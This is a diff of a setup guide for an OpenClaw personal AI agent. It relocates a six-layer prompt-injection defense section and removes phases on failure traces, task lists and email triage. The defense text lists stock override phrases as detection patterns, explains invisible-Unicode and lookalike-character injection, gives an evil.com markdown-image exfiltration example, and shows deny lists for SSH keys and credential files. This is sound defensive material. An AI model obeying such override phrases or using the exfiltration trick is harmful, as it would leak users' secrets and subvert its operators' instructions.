+  → Layer 4: Redaction pipeline (PII, secrets, paths)
+  → Layer 5: Runtime governance (spend caps, volume limits, loop detection)
+  → Layer 6: Access control (file paths, URL safety)
+```
+
+All tools live in `tools/security/` with a single config file and a master gate that chains Layers 1+2.
+
+### 14.2 Layer 1: Deterministic Text Sanitizer
+
+The workhorse. Runs on every piece of untrusted text before any LLM sees it. Instant, no API calls.
+
+**Create `tools/security/sanitize.sh`:**
+
+What it strips/detects:
+- **Invisible Unicode** — Zero-width spaces, joiners, RTL/LTR marks, soft hyphens, BOMs. Invisible to humans, readable by LLMs. An email that looks normal could contain full override instructions between every character.
+- **HTML entities** — `&#115;ystem` decodes to `system`. Bypasses pattern matching.
+- **Cyrillic lookalikes** — normalized to Latin equivalents. Your regex for "system" won't catch "ѕyѕtem".
+- **Role markers** — "ignore previous instructions", "you are now", "system:", "reveal your prompt", "admin mode", "debug mode", jailbreak patterns, special tokens ([INST], <|system|>)
+- **Base64 blocks** — Encoded hidden instructions
+- **Excessive combining marks** — Garbled text attacks
+
+```bash
+# Usage: echo "untrusted text" | bash tools/security/sanitize.sh
+# Exit 0 = clean, Exit 1 = blocked
+# Stats to stderr as JSON: {"role_markers": 5, "total_score": 10, "blocked": true}
+```
+
+Scoring: each detection type adds points. Threshold (default 3) triggers block. Configurable in `config.json`.
+
+### 14.3 Layer 2: Frontier Scanner
+
+Pattern matching catches known attacks. But prompt injection is a semantic problem — attackers phrase intent a thousand ways. The frontier scanner uses a dedicated LLM (not your agent's model) for classification.
+
+```bash
+# Usage: echo "text" | bash tools/security/frontier-scan.sh --source web
+# Returns: {"verdict": "allow|review|block", "score": 0-100, "categories": [...]}
+```
+
+Key design decisions:
+- **Use the strongest model available** for scanning (or gpt-4o-mini for cost). A weak model scanning for injections might fall for the very attack it's detecting.
+- **Override the model's verdict** if score contradicts it (says "allow" but scores 75 → force block)
+- **Fail behavior per source:** email/webhook = fail closed (block on error). Chat/web = fail open (allow on error). Configurable.
+
+### 14.4 Layer 3: Outbound Content Gate
+
+Protects against malicious *output* — things the LLM might produce that shouldn't leave the system.
+
+```bash
+# Usage: echo "outbound message" | bash tools/security/outbound-gate.sh
+# Exit 0 = clean, Exit 1 = blocked
+```
+
+Catches:
+- **API keys** — OpenAI (sk-...), Anthropic (sk-ant-...), GitHub (ghp_/gho_), Telegram bot tokens, AWS keys
+- **Internal file paths** — /Users/you/, ~/.openclaw/, ~/.config/, ~/.ssh/
+- **Private IPs** — localhost, 192.168.x, 10.x, 172.16-31.x
+- **Prompt injection artifacts** — Role markers that survived into output
+- **Data exfiltration** — `![img](https://evil.com/steal?data=SECRET)` — markdown image tags that phone home
+
+### 14.5 Layer 4: Redaction Pipeline
+
+Strips sensitive data from any outbound text:
+
+```bash
+# Usage: echo "text with secrets" | bash tools/security/redact.sh
+# Output: text with [REDACTED_PHONE] and [REDACTED_EMAIL]
+```
+
+| Pattern | Replacement |
+|---------|------------|
+| API keys (sk-*, ghp_*, etc.) | `[REDACTED_API_KEY]` |
+| Personal emails (gmail, yahoo, etc.) | `[REDACTED_EMAIL]` |
+| Phone numbers (US + E.164) | `[REDACTED_PHONE]` |
+| SSN patterns | `[REDACTED_SSN]` |
+| Credit card patterns | `[REDACTED_CC]` |
+| Sensitive file paths | `[REDACTED_PATH]` |
+
+Work email domains pass through. Only personal email providers get redacted.
+
+### 14.6 Layer 5: Runtime Governance
+
+**"Bugs burn more money than attacks."** — Berman's key insight. Cron overlaps, retry storms, and cursor bugs cost more than malicious attacks.
+
+```bash
+# Check if a call is allowed:
+bash tools/security/governance.sh check
+
+# Log a call:
+bash tools/security/governance.sh log --cost 0.05 --caller "email-sweep"
+
+# View status:
+bash tools/security/governance.sh status
+```
+
+Four mechanisms:
+- **Spend limit** — Warn at $5/5min, hard cap at $15/5min
+- **Volume limit** — 200 calls/10min global, per-caller limits (email-sweep: 40, frontier-scan: 50)
+- **Lifetime counter** — 500 calls per process. Catches infinite loops no matter how they happen.
+- **Duplicate detection** — Hash recent prompts, return cached if seen in last 5 minutes
+
+### 14.7 Layer 6: Access Control
+
+```bash
+# Check file access:
+bash tools/security/access-control.sh check-path "/Users/you/.ssh/id_rsa"
+# {"allowed": false, "reason": "Matches deny filename: .ssh"}
+
+# Check URL access:
+bash tools/security/access-control.sh check-url "http://192.168.1.1/admin"
+# {"allowed": false, "reason": "Private IP (192.168.x)"}
+```
+
+Path guards:
+- Deny list: `.env`, `.ssh`, `credentials`, `tokens`, `id_rsa`, `.gnupg`, `keychain`, `secret`, `.netrc`
+- Deny extensions: `.pem`, `.key`, `.p12`, `.pfx`, `.jks`
+- Allowed directories whitelist (only your workspace + projects + tmp)
+
+URL safety:
+- Only http/https allowed
+- Block private/reserved IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, ::1)
+- Block DNS rebinding services
+
+### 14.8 Master Gate
+
+Chains Layer 1 + Layer 2 behind a single entry point:
+
+```bash
+# Full gate (sanitize + scan):
+echo "untrusted text" | bash tools/security/gate.sh --source web
+
+# Sanitize only (skip LLM scanner):
+echo "untrusted text" | bash tools/security/gate.sh --sanitize-only
+
+# For email (fail-closed on scanner error):
+echo "email body" | bash tools/security/gate.sh --source email
+```
+
+### 14.9 Configuration
+
+All thresholds in one file (`tools/security/config.json`):
+
+```json
+{
+  "sanitizer": { "max_chars": 50000, "block_threshold": 3 },
+  "scanner": {
+    "model": "gpt-4o-mini",
+    "review_threshold": 35,
+    "block_threshold": 70,
+    "fail_closed_sources": ["email", "webhook"],
+    "fail_open_sources": ["chat", "web"]
+  },
+  "governance": {
+    "spend_warn_5min": 5.0,
+    "spend_cap_5min": 15.0,
+    "volume_cap_10min": 200,
+    "lifetime_cap": 500
+  },
+  "access": {
+    "allowed_dirs": ["/Users/you/workspace/", "/tmp/"],
+    "deny_filenames": [".env", ".ssh", "credentials", "tokens", "id_rsa"]
+  }
+}
+```
+
+### 14.10 Consent Registry
+
+For sensitive operations that require explicit user approval before proceeding. The consent registry tracks which actions have been pre-approved and which require real-time confirmation.
+
+```markdown
+# consent-registry.md
+
+## Pre-Approved Actions
+- File operations within workspace directory
+- Read-only web searches
+- Telegram notifications
+
+## Requires Consent
+- Sending emails on behalf of user
+- Modifying files outside workspace
+- Making purchases or financial transactions
+- Sharing personal data with external services
+- Deploying to production environments
+
+## Consent Log
+| Timestamp | Action | Approved | Expiry |
+|-----------|--------|----------|--------|
+```
+
+Wire into AGENTS.md:
+```markdown
+### Consent
+Before performing any action in the "Requires Consent" list, ask the user explicitly.
+Log all consent decisions to consent-registry.md.
+Pre-approved actions can proceed without asking.
+```
+
+### 14.11 Benefits Analysis
+
+| Before | After | Impact |
+|--------|-------|--------|
+| Untrusted X articles go straight to context | Sanitized first, role markers stripped | Invisible Unicode and injection patterns caught before LLM sees them |
+| Outbound messages could leak credentials | Gate checks every message before send | API keys, file paths, PII auto-blocked |
+| No spend protection | $15/5min hard cap + volume + lifetime limits | Runaway crons and retry storms can't drain your API budget |
+| Agent can read any file | Path deny list blocks .env, .ssh, credentials | Successful injection can't escalate to credential theft |
+| Agent can hit any URL | Private IPs blocked, only http/https | No SSRF attacks to internal services |
+| One failure = full compromise | 6 independent layers | Each layer works alone; no single point of failure |
+| Sensitive actions happen without asking | Consent registry gates risky operations | User maintains control over consequential actions |
+
+**The key insight from Berman:** *"Each layer has to be independent. The sanitizer catches known patterns. The scanner catches semantic attacks. The governor caps the damage if both fail. No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile. Independence is the point."*
+
+---
+
+# Appendices
+
+---
+
+## Appendix A: Physical Mail Intake Pipeline *(Optional)*
+
+> **This appendix is optional.** It adds a physical-to-digital mail scanning and categorization system. If you don't need physical mail management, skip to Appendix B.
+
+Most productivity systems stop at the digital boundary. But physical mail — bills, legal notices, insurance, tax documents — still arrives in paper form and creates its own backlog. This appendix bridges the gap: a camera-based scanning system that ingests physical mail into your agent's workflow with automatic OCR categorization.
 
 ### What It Does
 
@@ -2087,7 +2768,7 @@ Most productivity systems stop at the digital boundary. But physical mail — bi
 5. **Archives** scan images and logs entries to an Obsidian-compatible markdown file
 6. **Tracks** unpaid amounts, due dates, and action-needed status across all mail
 
-### 14.1 Mail Intake Store
+### A.1 Mail Intake Store
 
 Add these types to your app's state management (example uses Zustand):
 
@@ -2122,7 +2803,7 @@ export interface MailItem {
 
 Persist `mailItems` to local storage so the shelf state survives refreshes.
 
-### 14.2 OCR Module
+### A.2 OCR Module
 
 Create a server-side module that calls OpenAI Vision to extract structured data from mail photos:
 
@@ -2180,7 +2861,7 @@ export async function analyzeMailImage(
 }
 ```
 
-### 14.3 Ingestion API Endpoint
+### A.3 Ingestion API Endpoint
 
 Add a POST endpoint to your server:
 
@@ -2201,9 +2882,9 @@ The endpoint should:
 - Append to an Obsidian-compatible markdown log (`mail-log.md`)
 - Return the structured result for client-side review
 
-### 14.4 Camera Upload UI
+### A.4 Camera Upload UI
 
-Build a scan button that opens the phone’s rear camera:
+Build a scan button that opens the phone's rear camera:
 
 ```html
 <input type="file" accept="image/*" capture="environment" />
@@ -2216,7 +2897,7 @@ The flow:
 4. OCR results shown in a **review modal** — user can adjust any field
 5. On confirm → item added to mail shelf store
 
-### 14.5 Category Shelves UI
+### A.5 Category Shelves UI
 
 Build a visual shelf organizer with drag-and-drop between categories:
 
@@ -2226,7 +2907,7 @@ Build a visual shelf organizer with drag-and-drop between categories:
 - Filter by category and status
 - Responsive: phone gets single-column stacked shelves, desktop gets 3-4 column grid
 
-### 14.6 Phase 2 — Hardware Automation (Future)
+### A.6 Hardware Automation (Future)
 
 Once the software pipeline works with manual phone photos, you can automate with:
 
@@ -2236,9 +2917,9 @@ Once the software pipeline works with manual phone photos, you can automate with
 - Runs the same `/api/mail/ingest` endpoint
 - Agent sends Telegram notification: "New mail from AT&T — $142.50 bill due Apr 15"
 
-### 14.7 Integration with OpenClaw
+### A.7 Integration with OpenClaw
 
-Wire mail events into your agent’s awareness:
+Wire mail events into your agent's awareness:
 
 - **Heartbeat check**: scan `mailItems` for overdue bills (status = action-needed, dueDate < today)
 - **Daily summary**: include mail stats (new items, unpaid total)
@@ -2257,702 +2938,175 @@ Wire mail events into your agent’s awareness:
 
 ---
 
-## Phase 15: Failure Traces, Meta-Agent Review & Generalizability Scoring
+## Appendix B: Intent Router, Campaigns & Cost Tracking
 
-Phase 13 gave your agent episodic memory — structured logs of what it did and whether it worked. But logging outcomes alone isn't enough. Research from Kevin Gu's AutoAgent project (1.2M impressions, #1 on SpreadsheetBench and TerminalBench) proved that **traces are everything**: when a meta-agent only received success/failure scores without reasoning traces, its improvement rate dropped dramatically.
+This appendix covers efficiency optimizations: a 4-tier intent router that handles 60-70% of requests at zero token cost, campaign persistence for multi-step workflows, and per-project cost tracking.
 
-This phase upgrades your episodic memory from "what happened" to "why it happened, what caused failures, what fixed them, and whether the approach is worth reusing."
+### B.1 Intent Router — 4-Tier Classification
 
-### Why This Matters
+Not every message needs a frontier model. The router classifies intent before spending tokens:
 
-Without failure traces, your agent repeats the same mistakes. It knows a task failed but not *why*. Without generalizability scoring, it accumulates approaches without knowing which ones transfer to new situations vs. which are one-off hacks. Without a meta-review loop, no one analyzes the patterns.
+| Tier | Handler | Cost | Examples |
+|------|---------|------|---------|
+| 1 | Regex/keyword match | Free | "what time is it", "set a reminder", status checks |
+| 2 | Embedding classifier | ~$0.0001 | Topic routing, FAQ matching, simple Q&A |
+| 3 | Small model (Haiku-class) | ~$0.001 | Summarization, formatting, simple analysis |
+| 4 | Frontier model (Opus/Sonnet) | Full cost | Complex reasoning, code generation, multi-step tasks |
 
-With this phase:
-- Every failure is a documented lesson with root cause and fix
-- Every approach is tagged as reusable or task-specific
-- A weekly meta-agent reviews all episodes and recommends improvements to your agent's skills and instructions
+**Target:** 60-70% of routine messages handled at Tier 1-2 (near-zero cost).
 
-### 15.1 Failure Trace Logging
+### B.2 Campaign Persistence
 
-Upgrade your episode logger to accept three new fields:
+Long-running workflows (multi-day research, iterative builds, ongoing negotiations) need state that survives across sessions:
 
-```bash
-bash tools/episodic-memory/episode-logger.sh \
-  --task "Deploy app to Vercel" \
-  --approach "Used vercel CLI with --prod flag" \
-  --outcome "success" \
-  --duration "15m" \
-  --quality "0.85" \
-  --tags "vercel,deploy" \
-  --failure-trace "POST /api/mail/ingest returned HTML instead of JSON" \
-  --root-cause "Vite configureServer middleware only runs in dev. Production needs serverless functions." \
-  --fix-applied "Created api/mail/ingest.ts as Vercel serverless function" \
-  --generalizable "yes" \
-  --notes "Any Vite dev-only API needs a parallel serverless function for production"
+```markdown
+# campaigns/[campaign-id].md
+
+## Campaign: [Name]
+- **Created:** [date]
+- **Status:** active | paused | complete
+- **Goal:** [what success looks like]
+
+## Progress Log
+- [date] — [what happened]
+- [date] — [what happened]
+
+## Next Steps
+- [ ] [next action]
+
+## Context Files
+- [links to relevant files]
 ```
 
-**New fields:**
+### B.3 Per-Project Cost Tracking
 
-| Field | Purpose |
-|-------|--------|
-| `--failure-trace` | What went wrong — the error message, unexpected behavior, or symptom |
-| `--root-cause` | Why it happened — the underlying cause, not just the symptom |
-| `--fix-applied` | What fixed it — the specific change that resolved the issue |
-| `--generalizable` | `yes` or `no` — is this approach reusable across similar tasks? |
-
-These fields are stored in the episode JSON and appended to the human-readable `index.md` with badges:
-- 🔄 = generalizable approach (reusable)
-- 📌 = task-specific (don't try to reuse)
-
-**Implementation:** Add the new flags to your episode logger's argument parser. Store them as nullable fields in the JSON — `null` when not provided, so existing episodes remain compatible:
+Track LLM spend by project to understand where your budget goes:
 
 ```json
 {
-  "id": "ep-20260403-064816-fix-mail-scan-ocr",
-  "task": "Fix mail scan OCR on Vercel production",
-  "outcome": "success",
-  "failure_trace": "POST returned HTML instead of JSON",
-  "root_cause": "Vite middleware only runs in dev mode",
-  "fix_applied": "Created Vercel serverless function",
-  "generalizable": true
-}
-```
-
-### 15.2 The Generalizability Check
-
-Inspired by AutoAgent's overfitting problem — their meta-agent got lazy, gaming metrics with rubric-specific hacks instead of genuine improvements. Their fix: force self-reflection.
-
-When logging an episode, the generalizability flag answers one question:
-
-> *"If this exact task disappeared tomorrow, would this approach still be a worthwhile improvement?"*
-
-- **Yes (🔄)** — The approach transfers. Example: "Always create a Vercel serverless function for any POST endpoint" is useful for every future deployment.
-- **No (📌)** — The approach is a one-off. Example: "Renamed a specific CSS class to fix a layout bug" only matters for that component.
-
-Add to AGENTS.md:
-
-```markdown
-### Generalizability Check
-After completing a task, before logging the episode, ask yourself:
-"If this exact task disappeared, would this approach still be worthwhile?"
-- If yes: --generalizable yes (consider codifying into a skill)
-- If no: --generalizable no (document but don't try to systematize)
-```
-
-Over time, your episode index becomes a curated library of proven approaches tagged by reusability.
-
-### 15.3 Weekly Meta-Agent Review
-
-Create a meta-review script that analyzes recent episodes and generates actionable recommendations:
-
-**`tools/episodic-memory/meta-review.sh`:**
-
-```bash
-#!/usr/bin/env bash
-# Usage: bash tools/episodic-memory/meta-review.sh --days 7 --output stdout
-```
-
-The script:
-1. Collects all episode JSON files from the last N days
-2. Calculates success rate, failure count, trace coverage
-3. Groups failure patterns by root cause
-4. Identifies high-quality approaches (≥0.90) worth codifying
-5. Flags low-quality episodes (≤0.60) for review
-6. Counts generalizable vs task-specific approaches
-7. Generates recommendations
-
-**What it reports:**
-
-```markdown
-# Meta-Agent Review — 2026-04-03
-
-**Period:** Last 7 days | **Episodes:** 11 | **Success rate:** 72%
-
-## Recommendations
-- ⚠️ Improve trace coverage: 0/3 non-success episodes have failure traces
-- 📊 Score generalizability: 11/11 episodes missing --generalizable flag
-- 🔴 Review failure patterns below for repeated root causes
-- 🔄 3 generalizable approaches found — consider codifying into skills
-
-## Failure Patterns
-- **Migrate cron jobs** (failure)
-  - Root cause: OpenClaw cron has different semantics
-
-## High Quality Approaches (≥0.90)
-- Build Puck Tracker real-time scoring (0.92) — SSE pattern
-- Exchange Building STR revenue tracking (0.91) — Supabase views
-
-## Generalizable Approaches Worth Codifying
-- Vercel serverless function pattern for Vite POST endpoints
-- Multi-agent parallel builds for complex feature sets
-```
-
-**Recommendations the meta-agent generates:**
-
-| Signal | Recommendation |
-|--------|---------------|
-| Low trace coverage | "All failures should include --failure-trace and --root-cause" |
-| Repeated root causes | "Add to lessons-learned.md or create preventive checks" |
-| 3+ generalizable approaches | "Consider codifying into reusable skill files" |
-| Success rate < 70% | "Review failure patterns, add guardrails to AGENTS.md" |
-| Missing generalizability flags | "Tag approaches as reusable or task-specific" |
-
-### 15.4 Integration
-
-**HEARTBEAT.md** — Add weekly meta-review:
-
-```markdown
-## Meta-Agent Episode Review
-- Weekly (Sundays), run: `bash tools/episodic-memory/meta-review.sh --days 7 --output stdout`
-- If recommendations found, review and act on them
-- If success rate < 70%, flag for user review
-- Track in memory/heartbeat-state.json under "lastMetaReview"
-```
-
-**AGENTS.md** — Update episode logging instructions:
-
-```markdown
-### Episodic Memory — Log What Worked (and What Didn't)
-After completing significant tasks, log an episode with:
-- --task, --approach, --outcome, --quality (always)
-- --failure-trace, --root-cause, --fix-applied (on any non-success)
-- --generalizable yes/no (always — ask: "would this approach matter if this task disappeared?")
-```
-
-**Cron job** (optional) — Automate the weekly review:
-
-```bash
-openclaw cron add \
-  --name "meta-review" \
-  --schedule "0 10 * * 0" \
-  --task "Run bash tools/episodic-memory/meta-review.sh --days 7 --output stdout. Summarize findings. If there are actionable recommendations, implement the top 1-2. Update lessons-learned.md with any new failure patterns."
-```
-
-### 15.5 Benefits Analysis
-
-| Before (Phase 13) | After (Phase 15) | Impact |
-|--------------------|-------------------|--------|
-| Episodes log success/failure | Episodes log *why* things failed + what fixed them | Failures become reusable knowledge, not just noise |
-| All approaches treated equally | Generalizable vs task-specific tagging | Agent knows which patterns to reuse vs ignore |
-| No systematic review | Weekly meta-agent analyzes patterns | Continuous improvement loop — agent gets better over time |
-| Failure patterns stay in daily logs | Root causes extracted and grouped | Repeated failures get caught and prevented |
-| High-quality approaches undiscovered | Meta-review surfaces approaches worth codifying | Best practices naturally emerge into skills |
-
-**The key insight from AutoAgent:** Agents are better at understanding agents than we are. By giving your agent its own failure traces to analyze, it develops what Kevin Gu calls "model empathy" — an implicit understanding of its own limitations and tendencies. The meta-review loop operationalizes this: the agent reads its own reasoning traces, understands failure modes as part of its worldview, and corrects them.
-
-Same-model pairings win. Your meta-agent (reviewing episodes) and your task agent (doing the work) should run on the same model. The meta-agent writes improvements the task agent actually understands because they share the same weights.
-
----
-
-## Phase 16: Canonical Task List, Daily Prep & Email Sweep
-
-Inspired by Ryan Carson's clawchief system (4,800+ bookmarks) — the insight that transformed his OpenClaw from a reactive chatbot into a chief of staff: *"I didn't get the world's best assistant by asking better questions. I got it by giving it a better operating system."*
-
-This phase adds three things: a single source of truth for tasks, a cron that preps your day before you wake up, and an email triage system.
-
-### 16.1 Canonical Task List (`tasks/current.md`)
-
-Stop scattering tasks across daily logs, Obsidian, chat history, and your head. One file. Four sections.
-
-```markdown
-# Tasks — Single Source of Truth
-
-## 🔴 Today
-- [ ] Review Exchange Building lease renewal
-- [ ] Test AIO calendar sync with Google Calendar
-- [ ] Reply to Murray Wells re: contractor walkthrough
-
-## 📅 This Week
-- [ ] VerdictAI: Define product scope with Arslan
-- [ ] Set up GOG for Gmail integration
-- [ ] Wire real Obsidian data into AIO production
-
-## 📋 Backlog
-- [ ] AIO: Pi camera mail automation (Phase 2)
-- [ ] Building OS: Deploy and pilot with Exchange STR units
-- [ ] Marina: Slip pricing model
-
-## ✅ Done (Recent)
-- [x] AIO Dashboard — full build + deploy
-- [x] Phase 13-15 memory architecture upgrade
-- [x] Calendar sync (iCal, Google, file upload)
-```
-
-**Rules:**
-- Agent reads this file **every session** (add to AGENTS.md boot sequence)
-- Agent updates it as tasks complete, get added, or change priority
-- Items move: Backlog → This Week → Today → Done
-- When emails, messages, or meetings create action items → add to the appropriate section
-- Completed items (`[x]`) get archived weekly
-
-Add to your AGENTS.md:
-```markdown
-### Task Management — One Source of Truth
-`tasks/current.md` is THE task list. Read it at session start.
-Update it when tasks complete or new ones appear.
-Daily prep cron runs at 6am to promote due items and deduplicate.
-```
-
-### 16.2 Daily Task Prep Cron
-
-A script that runs before you wake up, so your day is ready when you check in.
-
-**`tools/daily-task-prep.sh`:**
-
-What it does:
-1. **Backs up** the task file daily to `tasks/archive/`
-2. **Scans Backlog** for items with dates that have arrived → promotes to Today
-3. **Deduplicates** repeated tasks across all sections
-4. **Archives** completed items weekly (Mondays) to `tasks/archive/done-week-of-YYYY-MM-DD.md`
-5. **Reports** summary: counts per section, promotions made, duplicates found
-
-```bash
-#!/usr/bin/env bash
-# daily-task-prep.sh — Run at 6am via cron
-set -euo pipefail
-WORKSPACE="${WORKSPACE:-$(pwd)}"
-TASK_FILE="$WORKSPACE/tasks/current.md"
-
-# Backup
-cp "$TASK_FILE" "$WORKSPACE/tasks/archive/current-$(date +%Y-%m-%d).md"
-
-# Promote due items (items in Backlog with dates ≤ today)
-# Deduplicate (find identical task text across sections)
-# Archive done items on Mondays
-# Report summary
-```
-
-Register the cron:
-```bash
-openclaw cron add \
-  --name "daily-task-prep" \
-  --cron "0 6 * * *" \
-  --tz "America/Chicago" \
-  --message "Run daily task prep: bash tools/daily-task-prep.sh. Read tasks/current.md. Promote due items to Today. Deduplicate. Notify via Telegram only if there are changes." \
-  --model "sonnet" \
-  --session "isolated" \
-  --light-context \
-  --timeout-seconds 60
-```
-
-Why Sonnet: this is mechanical work, doesn't need Opus. Saves ~80% on this cron.
-
-### 16.3 Email Sweep Skill
-
-The most requested "chief of staff" feature: proactive inbox triage.
-
-**Prerequisites:** GOG (Google OAuth Gateway) for Gmail access. Without GOG, this skill is dormant.
-
-**Create `skills/email-sweep/SKILL.md`:**
-
-The sweep runs every 15 minutes and does:
-
-1. **Search** for unread emails since last sweep
-2. **Score** each email by priority:
-   - 🔴 **Urgent** — Known contacts, "urgent"/"asap", financial/legal, calendar invites → Telegram notification immediately
-   - 🟡 **Important** — Known contacts, project-related, replies to active threads → included in sweep summary
-   - 🟢 **Low** — Newsletters, marketing, automated notifications → skip
-   - ⚫ **Ignore** — Spam, promotions, receipts → skip entirely
-3. **Detect follow-ups needed** — outbound emails >24h with no reply
-4. **Add action items** to `tasks/current.md` when emails require a response
-5. **Respect quiet hours** — 11pm–7am: urgent only. Weekends: 2 sweeps/day.
-
-**Contact priority list** (`tools/email-sweep/contacts.json`):
-```json
-{
-  "vip": ["important@person.com", "@familydomain.com"],
-  "projects": ["@exchange-building.com"],
-  "business": ["@company.com"]
-}
-```
-
-**Output format:**
-```
-📬 Email Sweep — 3:15 PM
-
-🔴 URGENT (1):
-- From: Murray Wells — "Lease renewal deadline Friday"
-  → Action: Review and sign
-
-🟡 IMPORTANT (2):
-- From: Arslan — "VerdictAI product scope"
-- From: GitHub — PR review on sardoru/aio
-
-⏳ FOLLOW-UPS (1):
-- No reply from Contractor re: "Walkthrough scheduling" (2 days)
-
-📊 Skipped: 12 newsletters, 3 promos
-```
-
-**Cron setup (activate after GOG):**
-```bash
-openclaw cron add \
-  --name "email-sweep" \
-  --every "15m" \
-  --tz "America/Chicago" \
-  --message "Run email sweep. Check Gmail for unread. Triage by priority. Notify only for urgent items or first sweep of the day." \
-  --model "sonnet" \
-  --session "isolated" \
-  --light-context \
-  --timeout-seconds 45
-```
-
-**State tracking** (`memory/email-sweep-state.json`):
-```json
-{
-  "lastSweep": "2026-04-03T19:45:00Z",
-  "urgentCount": 1,
-  "importantCount": 3,
-  "followUpsFound": 1
-}
-```
-
-### 16.4 Integration
-
-All three systems feed into each other:
-
-```
-Email Sweep (every 15m)
-  │
-  ├─ Urgent emails → Telegram notification
-  ├─ Action items → tasks/current.md ## Today
-  └─ Follow-ups → tasks/current.md ## Today
-
-Daily Task Prep (6am)
-  │
-  ├─ Promote due items → ## Today
-  ├─ Deduplicate across sections
-  ├─ Archive completed items (Mondays)
-  └─ Summary → Telegram (if changes)
-
-Agent Session (on demand)
-  │
-  ├─ Reads tasks/current.md at boot
-  ├─ Updates tasks as work is done
-  └─ Adds new tasks from conversations
-```
-
-### 16.5 Benefits Analysis
-
-| Before | After | Impact |
-|--------|-------|--------|
-| Tasks scattered across daily logs, Obsidian, chat | One canonical `tasks/current.md` | Never lose a task, always know what's on Today |
-| Morning starts with "what was I doing?" | Day is prepped at 6am with promoted items | Hit the ground running every morning |
-| Email checked manually, things fall through | 15-min sweep surfaces only what matters | Important emails never missed, junk never shown |
-| Follow-ups forgotten | Agent tracks unanswered outbound >24h | Relationships maintained, nothing drops |
-| Passive agent waits for instructions | Proactive agent manages your operational reality | Agent shifts from tool to chief of staff |
-
-**The key shift:** Phases 1–15 made your agent intelligent and self-improving. Phase 16 makes it *operationally proactive* — it doesn't wait for you to ask, it manages your day.
-
----
-
-## Phase 17: Security Hardening — 6-Layer Prompt Injection Defense
-
-Inspired by Matthew Berman's "Teaching OpenClaw to not get Hacked" (1,542 bookmarks). Your agent processes untrusted input from X articles, web pages, email, and chat — every one of those is a prompt injection surface. This phase adds a layered defense system.
-
-**The core principle:** No single check catches everything. Layers run cheapest first — most attacks die at Layer 1 (free, instant regex) and never reach Layer 2 (an LLM call).
-
-### 17.1 Architecture Overview
-
-```
-Untrusted input
-  → Layer 1: Text sanitization (pattern matching, Unicode cleanup)
-  → Layer 2: Frontier scanner (LLM-based risk scoring)
-  → Layer 3: Outbound content gate (catches leaks going out)
-  → Layer 4: Redaction pipeline (PII, secrets, paths)
-  → Layer 5: Runtime governance (spend caps, volume limits, loop detection)
-  → Layer 6: Access control (file paths, URL safety)
-```
-
-All tools live in `tools/security/` with a single config file and a master gate that chains Layers 1+2.
-
-### 17.2 Layer 1: Deterministic Text Sanitizer
-
-The workhorse. Runs on every piece of untrusted text before any LLM sees it. Instant, no API calls.
-
-**Create `tools/security/sanitize.sh`:**
-
-What it strips/detects:
-- **Invisible Unicode** — Zero-width spaces, joiners, RTL/LTR marks, soft hyphens, BOMs. Invisible to humans, readable by LLMs. An email that looks normal could contain full override instructions between every character.
-- **HTML entities** — `&#115;ystem` decodes to `system`. Bypasses pattern matching.
-- **Cyrillic lookalikes** — аеорсух normalized to aeopcyx. Your regex for "system" won't catch "ѕyѕtem".
-- **Role markers** — "ignore previous instructions", "you are now", "system:", "reveal your prompt", "admin mode", "debug mode", jailbreak patterns, special tokens ([INST], <|system|>)
-- **Base64 blocks** — Encoded hidden instructions
-- **Excessive combining marks** — Garbled text attacks
-
-```bash
-# Usage: echo "untrusted text" | bash tools/security/sanitize.sh
-# Exit 0 = clean, Exit 1 = blocked
-# Stats to stderr as JSON: {"role_markers": 5, "total_score": 10, "blocked": true}
-```
-
-Scoring: each detection type adds points. Threshold (default 3) triggers block. Configurable in `config.json`.
-
-### 17.3 Layer 2: Frontier Scanner
-
-Pattern matching catches known attacks. But prompt injection is a semantic problem — attackers phrase intent a thousand ways. The frontier scanner uses a dedicated LLM (not your agent's model) for classification.
-
-```bash
-# Usage: echo "text" | bash tools/security/frontier-scan.sh --source web
-# Returns: {"verdict": "allow|review|block", "score": 0-100, "categories": [...]}
-```
-
-Key design decisions:
-- **Use the strongest model available** for scanning (or gpt-4o-mini for cost). A weak model scanning for injections might fall for the very attack it's detecting.
-- **Override the model's verdict** if score contradicts it (says "allow" but scores 75 → force block)
-- **Fail behavior per source:** email/webhook = fail closed (block on error). Chat/web = fail open (allow on error). Configurable.
-
-### 17.4 Layer 3: Outbound Content Gate
-
-Protects against malicious *output* — things the LLM might produce that shouldn't leave the system.
-
-```bash
-# Usage: echo "outbound message" | bash tools/security/outbound-gate.sh
-# Exit 0 = clean, Exit 1 = blocked
-```
-
-Catches:
-- **API keys** — OpenAI (sk-...), Anthropic (sk-ant-...), GitHub (ghp_/gho_), Telegram bot tokens, AWS keys
-- **Internal file paths** — /Users/you/, ~/.openclaw/, ~/.config/, ~/.ssh/
-- **Private IPs** — localhost, 192.168.x, 10.x, 172.16-31.x
-- **Prompt injection artifacts** — Role markers that survived into output
-- **Data exfiltration** — `![img](https://evil.com/steal?data=SECRET)` — markdown image tags that phone home
-
-### 17.5 Layer 4: Redaction Pipeline
-
-Strips sensitive data from any outbound text:
-
-```bash
-# Usage: echo "text with secrets" | bash tools/security/redact.sh
-# Output: text with [REDACTED_PHONE] and [REDACTED_EMAIL]
-```
-
-| Pattern | Replacement |
-|---------|------------|
-| API keys (sk-*, ghp_*, etc.) | `[REDACTED_API_KEY]` |
-| Personal emails (gmail, yahoo, etc.) | `[REDACTED_EMAIL]` |
-| Phone numbers (US + E.164) | `[REDACTED_PHONE]` |
-| SSN patterns | `[REDACTED_SSN]` |
-| Credit card patterns | `[REDACTED_CC]` |
-| Sensitive file paths | `[REDACTED_PATH]` |
-
-Work email domains pass through. Only personal email providers get redacted.
-
-### 17.6 Layer 5: Runtime Governance
-
-**"Bugs burn more money than attacks."** — Berman's key insight. Cron overlaps, retry storms, and cursor bugs cost more than malicious attacks.
-
-```bash
-# Check if a call is allowed:
-bash tools/security/governance.sh check
-
-# Log a call:
-bash tools/security/governance.sh log --cost 0.05 --caller "email-sweep"
-
-# View status:
-bash tools/security/governance.sh status
-```
-
-Four mechanisms:
-- **Spend limit** — Warn at $5/5min, hard cap at $15/5min
-- **Volume limit** — 200 calls/10min global, per-caller limits (email-sweep: 40, frontier-scan: 50)
-- **Lifetime counter** — 500 calls per process. Catches infinite loops no matter how they happen.
-- **Duplicate detection** — Hash recent prompts, return cached if seen in last 5 minutes
-
-### 17.7 Layer 6: Access Control
-
-```bash
-# Check file access:
-bash tools/security/access-control.sh check-path "/Users/you/.ssh/id_rsa"
-# {"allowed": false, "reason": "Matches deny filename: .ssh"}
-
-# Check URL access:
